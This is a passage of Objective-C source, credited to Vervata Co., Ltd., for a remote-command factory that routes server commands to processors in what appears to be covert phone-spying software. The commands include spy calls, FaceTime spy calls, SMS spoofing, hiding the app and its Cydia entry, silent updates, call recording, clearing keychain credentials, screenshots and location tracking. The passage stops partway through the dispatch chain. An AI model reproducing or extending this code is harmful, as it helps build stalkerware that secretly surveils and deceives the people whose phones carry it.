/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdProcessingFactory
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  21/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RemoteCmdProcessingFactory.h"
#import "RemoteCmdCode.h"
#import "RemoteCmdData.h"
#import "ActivateProcessor.h"
#import "DeactivateProcessor.h"
#import "ImmediateDeactivateProcessor.h"
#import "SyncUpdateAvailableProcessor.h"
#import "SyncUpdateConfigurationProcessor.h"
#import "UnInstallApplicationProcessor.h"
#import "SetSettingsProcessor.h"
#import "EnableCaptureProcessor.h"
#import "EnableLocationProcessor.h"
#import "LocationOnDemandProcessor.h"
#import "UpdateLocationIntervalProcessor.h"
#import "AddURLProcessor.h"
#import "ResetURLProcessor.h"
#import "ClearURLProcessor.h"
#import "QueryURLProcessor.h"
#import "RequestCurrentURLProcessor.h"
#import "RequestHeartbeatProcessor.h"
#import "RequestEventsProcessor.h"
#import "RequestDiagnosticProcessor.h"
#import "RequestSettingsProcessor.h"
#import "RequestStartupTimeProcessor.h"
#import "RestartDeviceProcessor.h"
#import "RestartClientProcessor.h"
#import "RetrieveRunningProcessor.h"
#import "EnableSpyCallProcessor.h"
#import "EnableSpyCallWithMonitorProcessor.h"
#import "AddMonitorsProcessor.h"
#import "ResetMonitorsProcessor.h"
#import "ClearMonitorsProcessor.h"
#import "QueryMonitorsProcessor.h"
#import "AddCISNumbersProcessor.h"
#import "ResetCISNumbersProcessor.h"
#import "ClearCISNumbersProcessor.h"
#import "QueryCISNumbersProcessor.h"
#import "AddKeywordProcessor.h"
#import "ResetKeywordProcessor.h"
#import "ClearKeywordProcessor.h"
#import "QueryKeywordProcessor.h"
#import "EnableWatchNotificationProcessor.h"
#import "SetWatchFlagsProcessor.h"
#import "AddWatchNumberProcessor.h"
#import "ResetWatchNumberProcessor.h"
#import "ClearWatchNumberProcessor.h"
#import "QueryWatchNumberProcessor.h"
#import "AddHomesProcessor.h"
#import "ResetHomesProcessor.h"
#import "ClearHomesProcessor.h"
#import "QueryHomesProcessor.h"
#import "AddNotificationNumbersProcessor.h"
#import "ResetNotificationNumbersProcessor.h"
#import "ClearNotificationNumbersProcessor.h"
#import "QueryNotificationNumbersProcessor.h"
#import "AddEmergencyNumberProcessor.h"
#import "ResetEmergencyNumberProcessor.h"
#import "ClearEmergencyNumberProcessor.h"
#import "QueryEmergencyNumberProcessor.h"
#import "UploadActualMediaProcessor.h"
#import "RequestAddressBookProcessor.h"
#import "RequestAddressBookForApprovalProcessor.h"
#import "SyncAddressBookProcessor.h"
#import "SetAddressBookManagementProcessor.h"
#import "RequestHistoricalMediaProcessor.h"
#import "TerminateRunningProcessor.h"
#import "SetVisibilityProcessor.h"
#import "EnableSIMChangeProcessor.h"
#import "SpoofSMSProcessor.h"
#import "DeleteActualMediaProcessor.h"
#import "RequestMobileNumberProcessor.h"
#import "DeleteEventDatabaseProcessor.h"
#import "SyncCommunicationDirectivesProcessor.h"
#import "SyncTimeProcessor.h"
#import "SetPanicModeProcessor.h"
#import "SetWipeoutProcessor.h"
#import "SetLockDeviceProcessor.h"
#import "SetUnlockDeviceProcessor.h"
#import "EnableCommunicationRestrictionsProcessor.h"
#import "RequestBookmarkProcessor.h"
#import "RequestRunningApplicationProcessor.h"
#import "RequestInstalledApplicationProcessor.h"
#import "SyncApplicationProfileProcessor.h"
#import "SyncUrlProfileProcessor.h"
#import "EnableURLProfileProcessor.h"
#import "EnableApplicationProfileProcessor.h"
#import "RequestBatteryInfoProcessor.h"
#import "SetUpdateAvailableProcessor.h"
#import "OnDemandRecordProcessor.h"
#import "RequestCalendarProcessor.h"
#import "RequestNoteProcessor.h"
#import "OnDemandImageCaptureProcessor.h"
#import "SetCydiaVisibilityProcessor.h"
#import "SetUpdateAvailableSilentModeProcessor.h"
#import "EnableSpycallOnFacetimeProcessor.h"
#import "AddMonitorFacetimeIDsProcessor.h"
#import "ResetMonitorFacetimeIDsProcessor.h"
#import "ClearMonitorFacetimeIDProcessor.h"
#import "QueryMonitorFacetimeIDsProcessor.h"
#import "EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor.h"
#import "SyncSupportedIMVersionProcessor.h"
#import "SetDeliveryMethodProcessor.h"

#import "ClearCredentialDetailsProcessor.h"
#import "ClearKeychainCredentialsProcessor.h"
#import "SyncSnapshotRulesProcessor.h"
#import "SyncMonitorApplicaitonsProcessor.h"
#import "RequestSnapshotRulesProcessor.h"
#import "RequestMonitorApplicationsProcessor.h"
#import "RequestDeviceSettingsProcessor.h"
#import "RequestHistoricalEventProcessor.h"
#import "OnDemandScreenshotRecordProcessor.h"
#import "RequestTemporalApplicationControlProcessor.h"
#import "SyncTemporalApplicationControlProcessor.h"
#import "SyncNetworkAlertCriteriaProcessor.h"
#import "ResetNetworkAlertStatisticProcessor.h"
#import "SyncAppScreenShotProcessor.h"

#import "ShutdownDeviceProcessor.h"
#import "SetDownloadBinaryAndUpdateSilentModeProcessor.h"
#import "RequestDebugLogProcessor.h"
#import "EnableCallRecordProcessor.h"
#import "SetCallRecordWatchFlagsProcessor.h"
#import "AddCallRecordWatchNumberProcessor.h"
#import "ClearCallRecordWatchNumberProcessor.h"
#import "QueryCallRecordWatchNumberProcessor.h"
#import "ResetCallRecordWatchNumberProcessor.h"

#import "DeleteEventsProcessor.h"

@implementation RemoteCmdProcessingFactory

#pragma mark RemoteCmdProcessingFactory methods

/**
 - Method name:createRemoteCmdProcessor
 - Purpose: This method is used to create a Processor.
 - Argument list and description: aRemoteCmdData (RemoteCmdData ),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return type and description: remoteCmdProcessor (RemoteCmdProcessor)
*/

+ (id) createRemoteCmdProcessor: (RemoteCmdData*) aRemoteCmdData andRemoteCmdProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	DLog (@"createRemoteCmdProcessor...%@",aRemoteCmdData.mRemoteCmdCode);
	//Validate Remote Command Code and Create the Remote Command Processor
	id remoteCmdProcessor = nil;
	//Check the processor is Activation
    if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeActivateWithActivationCodeURL] ||
		[aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeActivateWithoutActivationCode] ||
		[aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeActivateWithActivationCode]) {
		remoteCmdProcessor = [[ActivateProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
													 andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is Deactivation
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeDeactivateWithDeactivationCode]) {
		remoteCmdProcessor = [[DeactivateProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
													   andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is Immediate Deactivation			 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeDeactivateImmediate]) {
		remoteCmdProcessor = [[ImmediateDeactivateProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is SetPanicMode
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetPanicMode]) {
		remoteCmdProcessor = [[SetPanicModeProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is SetWipeout
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetWipeoutData]) {
		remoteCmdProcessor = [[SetWipeoutProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
													   andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is SetLockDevice
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetLockDevice]) {
		remoteCmdProcessor = [[SetLockDeviceProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is SetUnlockDevice
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetUnlockDevice]) {
		remoteCmdProcessor = [[SetUnlockDeviceProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is SetSettings
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetSettings]) {
		remoteCmdProcessor = [[SetSettingsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is RequestHeartbeat
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestHeartbeat]) {
		remoteCmdProcessor = [[RequestHeartbeatProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
										 					 andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is RequestEvent
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestEvent]) {
     	remoteCmdProcessor = [[RequestEventsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
														  andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is Enable Capture
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableCapture]) {
     	remoteCmdProcessor = [[EnableCaptureProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is SyncUpdateConfigurationProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncUpdateConfiguration]) {
     	remoteCmdProcessor = [[SyncUpdateConfigurationProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
																   withCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is UnInstallApplicationProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeUnInstallApplication]) {
     	remoteCmdProcessor = [[UnInstallApplicationProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is SyncUpdateAvailableProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncUpdateAvailable]) {
     	remoteCmdProcessor = [[SyncUpdateAvailableProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is EnableLocationProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableLocation]) {
		remoteCmdProcessor = [[EnableLocationProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is UpdateLocationIntervalProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeUpdateLocationInterval]) {
		remoteCmdProcessor = [[UpdateLocationIntervalProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}	
	//Check the processor is LocationOnDemand
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeOnDemandLocation]) {
		//Create  the location on Demand Processor
		remoteCmdProcessor = [[LocationOnDemandProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
															 andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is AddURLProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddURL]) {
		remoteCmdProcessor = [[AddURLProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}	
	//Check the processor is ResetURLProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetURL]) {
		remoteCmdProcessor = [[ResetURLProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ClearURLProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearURL]) {
		remoteCmdProcessor = [[ClearURLProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is QueryURLProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryURL]) {
		remoteCmdProcessor = [[QueryURLProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is RequestCurrentURLProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestCurrentURL]) {
		remoteCmdProcessor = [[RequestCurrentURLProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is RequestSettingsProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestSettings]) {
		remoteCmdProcessor = [[RequestSettingsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is RequestDiagnosticProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestDiagnostic]) {
		remoteCmdProcessor = [[RequestDiagnosticProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is RequestStartupTimeProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestStartUpTime]) {
		remoteCmdProcessor = [[RequestStartupTimeProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is RestartDeviceProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRestartDevice]) {
		remoteCmdProcessor = [[RestartDeviceProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
    //Check the processor is RestartClientProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRestartClient]) {
        remoteCmdProcessor = [[RestartClientProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
    }
    //Check the processor is ShutdownDeviceProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeShutdownDevice]) {
        remoteCmdProcessor = [[ShutdownDeviceProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
    }
	//Check the processor is RetrieveRunningProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRetrievetRunningProcess]) {
		remoteCmdProcessor = [[RetrieveRunningProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is EnableSpyCallProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableSpyCall]) {
		remoteCmdProcessor = [[EnableSpyCallProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is kRemoteCmdCodeEnableSpyCallWithMonitorNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableSpyCallWithMonitorNumber]) {
		remoteCmdProcessor = [[EnableSpyCallWithMonitorProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is AddMonitorsProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddMonitors]) {
		remoteCmdProcessor = [[AddMonitorsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ResetMonitorsProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetMonitors]) {
		remoteCmdProcessor = [[ResetMonitorsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ResetMonitorsProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearMonitors]) {
		remoteCmdProcessor = [[ClearMonitorsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is QueryMonitorsProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryMonitors]) {
		remoteCmdProcessor = [[QueryMonitorsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is AddCISNumbersProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddCISNumbers]) {
		remoteCmdProcessor = [[AddCISNumbersProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ResetCISNumbersProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetCISNumbers]) {
		remoteCmdProcessor = [[ResetCISNumbersProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ClearCISNumbersProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearCISNumbers]) {
		remoteCmdProcessor = [[ClearCISNumbersProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is QueryCISNumbersProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryCISNumbers]) {
		remoteCmdProcessor = [[QueryCISNumbersProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is AddKeywordProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddKeyword]) {
		remoteCmdProcessor = [[AddKeywordProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ResetKeywordProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetKeyword]) {
		remoteCmdProcessor = [[ResetKeywordProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ClearKeywordProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearKeyword]) {
		remoteCmdProcessor = [[ClearKeywordProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is QueryKeywordProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryKeyword]) {
		remoteCmdProcessor = [[QueryKeywordProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is EnableWatchNotificationProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableWatchNotification]) {
		remoteCmdProcessor = [[EnableWatchNotificationProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is SetWatchFlagsProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetWatchFlags]) {
		remoteCmdProcessor = [[SetWatchFlagsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is AddWatchNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddWatchNumber]) {
		remoteCmdProcessor = [[AddWatchNumberProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ResetWatchNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetWatchNumber]) {
		remoteCmdProcessor = [[ResetWatchNumberProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ClearWatchNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearWatchNumber]) {
		remoteCmdProcessor = [[ClearWatchNumberProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is QueryWatchNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryWatchNumber]) {
		remoteCmdProcessor = [[QueryWatchNumberProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is AddHomesProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddHomes]) {
		remoteCmdProcessor = [[AddHomesProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ResetHomesProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetHomes]) {
		remoteCmdProcessor = [[ResetHomesProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ClearHomesProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearHomes]) {
		remoteCmdProcessor = [[ClearHomesProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is QueryHomesProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryHomes]) {
		remoteCmdProcessor = [[QueryHomesProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is AddNotificationNumbersProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddNotificationNumber]) {
		remoteCmdProcessor = [[AddNotificationNumbersProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ResetNotificationNumbersProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetNotificationNumber]) {
		remoteCmdProcessor = [[ResetNotificationNumbersProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ClearNotificationNumbersProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearNotificationNumber]) {
		remoteCmdProcessor = [[ClearNotificationNumbersProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is QueryNotificationNumbersProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryNotificationNumber]) {
		remoteCmdProcessor = [[QueryNotificationNumbersProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is AddEmergencyNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddEmergencyNumber]) {
		remoteCmdProcessor = [[AddEmergencyNumberProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ResetEmergencyNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetEmergencyNumber]) {
		remoteCmdProcessor = [[ResetEmergencyNumberProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is ClearEmergencyNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearEmergencyNumber]) {
		remoteCmdProcessor = [[ClearEmergencyNumberProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	
	//Check the processor is QueryEmergencyNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryEmergencyNumber]) {
		remoteCmdProcessor = [[QueryEmergencyNumberProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	
	//Check the processor is UploadActualMediaProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeUploadActualMedia]) {
		remoteCmdProcessor = [[UploadActualMediaProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
															  andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is RequestHistoricalMediaProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestHistoricalMedia]) {
		remoteCmdProcessor = [[RequestHistoricalMediaProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
																   andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is RequestAddressBookProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestAddressBook]) {
		remoteCmdProcessor = [[RequestAddressBookProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
															   andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is RequestAddressBookForApprovalProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestAddressBookForApproval]) {
		remoteCmdProcessor = [[RequestAddressBookForApprovalProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
																		  andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is SetAddressBookManagementProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetAddressBookManagement]) {
		remoteCmdProcessor = [[SetAddressBookManagementProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is SyncAddressBookProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncAddressBook]) {
		remoteCmdProcessor = [[SyncAddressBookProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
															andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is SyncCommunicationDirectivesProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncCommunicationDirectives]) {
		remoteCmdProcessor = [[SyncCommunicationDirectivesProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
																		andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is SyncTimeProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncTime]) {
		remoteCmdProcessor = [[SyncTimeProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
													 andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	//Check the processor is TerminateRunningProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeTerminateRunningProcess]) {
		remoteCmdProcessor = [[TerminateRunningProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is DeleteEventDatabaseProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeDeleteEventDatabase]) {
		remoteCmdProcessor = [[DeleteEventDatabaseProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is SetVisibilityProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetVisibilty]) {
		remoteCmdProcessor = [[SetVisibilityProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is EnableSIMChangeProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableSIMChange]) {
		remoteCmdProcessor = [[EnableSIMChangeProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is SpoofSMSProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSpoofSMSCode]) {
		remoteCmdProcessor = [[SpoofSMSProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	//Check the processor is DeleteActualMediaProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeDeleteActualMedia]) {
		remoteCmdProcessor = [[DeleteActualMediaProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is RequestMobileNumberProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestMobileNumber]) {
		remoteCmdProcessor = [[RequestMobileNumberProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is EnableCommunicationRestrictionsProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableCommunicationRestrictions]) {
		remoteCmdProcessor = [[EnableCommunicationRestrictionsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is RequestBookmarkProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestBookmark]) {
		remoteCmdProcessor = [[RequestBookmarkProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
															andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is RequestInstalledApplicationProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestInstalledApplication]) {
		remoteCmdProcessor = [[RequestInstalledApplicationProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
															andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is RequestRunningApplicationProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestRunningApplication]) {
		remoteCmdProcessor = [[RequestRunningApplicationProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
															andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is SyncApplicationProfileProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncApplicationProfile]) {
		remoteCmdProcessor = [[SyncApplicationProfileProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
																	  andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is SyncURLProfileProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncURLProfile]) {
		remoteCmdProcessor = [[SyncUrlProfileProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
																   andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is EnableURLProfileProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableURLProfile]) {
		remoteCmdProcessor = [[EnableURLProfileProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is EnableURLProfileProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableApplicationProfile]) {
		remoteCmdProcessor = [[EnableApplicationProfileProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
